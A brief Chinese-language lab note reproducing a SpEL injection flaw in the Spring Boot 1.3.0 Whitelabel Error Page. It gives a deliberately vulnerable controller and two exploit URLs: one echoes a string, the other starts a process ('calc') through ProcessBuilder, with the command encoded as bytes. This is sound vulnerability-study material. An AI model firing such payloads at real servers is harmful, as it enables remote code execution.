## Spring Boot

### Spring Boot框架Whitelabel Error Page SpEL注入

#### 环境 

  `SpringBootEl.war` 或者自己编译源码 `spring-boot-1.3.0.RELEASE`

#### 安装

将 `war` 放在 `tomcat` web目录下

#### 配置

`war` 包无需配置 ，源码需要如下配置

找到 `spring-boot-1.3.0.RELEASE\spring-boot-1.3.0.RELEASE\spring-boot-samples\spring-boot-sample-tomcat-jsp` 文件。

修改 `WelcomeController` 代码.

```java
@RequestMapping("/fail2") public String fail2(String payload) {
   System.out.print(payload);
   Integer.parseInt(payload); throw new IllegalStateException();
}
```

#### 利用

```
http://127.0.0.1:8080/fail2?payload=${new%20java.lang.String(new%20byte[]{86,117,108,110,101,114,97,98,108,101})}
```

![1](.\img\1.png)

```
http://127.0.0.1:8080/fail2?payload=${new%20java.lang.ProcessBuilder(new%20java.lang.String(new%20byte[]{99,97,108,99})).start()}
```



![2](.\img\2.png)

#### 参考

* http://www.moonsec.com/post-701.html